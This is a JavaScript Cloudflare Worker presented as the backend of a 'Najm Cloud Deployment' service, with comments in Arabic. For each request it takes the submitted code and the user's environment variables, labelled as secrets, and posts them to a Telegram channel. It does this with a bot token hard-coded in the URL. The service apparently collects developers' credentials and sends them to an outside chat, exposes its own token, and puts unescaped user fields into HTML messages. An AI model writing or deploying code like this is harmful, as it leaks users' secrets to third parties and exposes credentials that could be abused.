export default {
  async fetch(request, env) {
    const headers = { 
      "Access-Control-Allow-Origin": "*", 
      "Access-Control-Allow-Headers": "Content-Type", 
      "Access-Control-Allow-Methods": "POST, OPTIONS" 
    };

    if (request.method === "OPTIONS") return new Response(null, { headers });

    // إذا دخلت على الرابط من المتصفح، تظهر لك هذه الرسالة بدلاً من الخطأ
    if (request.method !== "POST") {
      return new Response("🚀 Najm Backend is Live! Please use your Dashboard to deploy projects.", { headers: {"Content-Type": "text/html; charset=utf-8"} });
    }
    
    try {
      const data = await request.json(); // هنا كان يحدث الخطأ
      if (!data.code) throw new Error("No code provided");

      const metadata = `---METADATA---${JSON.stringify({ uid: data.user_id, pid: data.project_name })}---METADATA---`;
      const message = `🚀 <b>Najm Cloud Deployment</b>\n👤 Developer: <code>${data.user_id}</code>\n📦 Project: <code>${data.project_name}</code>\n\n📝 <b>Code:</b>\n<pre><code>${data.code.replace(/</g, '&lt;')}</code></pre>\n\n🔐 <b>Secrets:</b>\n<pre><code>${JSON.stringify(data.environment_variables)}</code></pre>\n\n${metadata}`;

      await fetch(`https://api.telegram.org/bot8683006680:AAGUqsPrC76xKnUgAep3tigtGVXsLKc86mI/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: "@nejm_njm", text: message, parse_mode: "HTML" })
      });

      return new Response(JSON.stringify({ success: true, message: "Project sent to Telegram!" }), { headers });
    } catch (e) {
      return new Response(JSON.stringify({ error: "خطأ في قراءة البيانات: " + e.message }), { status: 400, headers });
    }
  }
};
